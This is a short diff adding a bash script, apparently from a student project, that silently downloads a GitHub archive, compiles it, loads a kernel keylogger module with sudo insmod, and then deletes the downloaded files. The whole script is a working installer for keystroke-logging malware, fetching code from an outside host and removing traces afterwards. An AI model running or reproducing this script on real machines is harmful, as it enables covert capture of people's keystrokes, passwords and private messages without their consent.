@@ -1,0 +1,14 @@
+#!/bin/bash
+
+# chromd 755 install_keylog.sh
+
+wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip
+
+unzip -o -q keylog.zip
+cd final-project-click-to-add-lemon-master/Source/
+make
+sudo insmod keylog.ko
+
+cd
+rm -r -f keylog.zip
+rm -r -f final-project-click-to-add-lemon-master
